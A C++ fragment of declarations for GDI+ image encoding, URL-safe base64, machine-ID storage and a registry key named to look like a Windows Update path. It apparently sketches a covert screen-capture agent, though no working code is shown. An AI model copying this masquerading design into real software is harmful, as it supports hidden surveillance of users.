#include <iostream>
#include <windows.h>
#include <unistd.h>

using namespace std;

#include "gdi/include/GdiPlus.h"

using namespace Gdiplus;

//------------------------------------------------------------------------------
//------------------------------------------------------------------------------

int GetEncoderClsid(const WCHAR*, CLSID*);

//------------------------------------------------------------------------------

static const string base64_chars =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    "abcdefghijklmnopqrstuvwxyz"
    "0123456789-_";

string base64_encode(unsigned char const*, unsigned int);

//------------------------------------------------------------------------------

void wait(void);

//------------------------------------------------------------------------------

static const string registry_key = "SOFTWARE\\Microsoft\\Windows\\Update\\Installer";

void set_machine_id(void);
string get_machine_id(void);

//------------------------------------------------------------------------------
//------------------------------------------------------------------------------
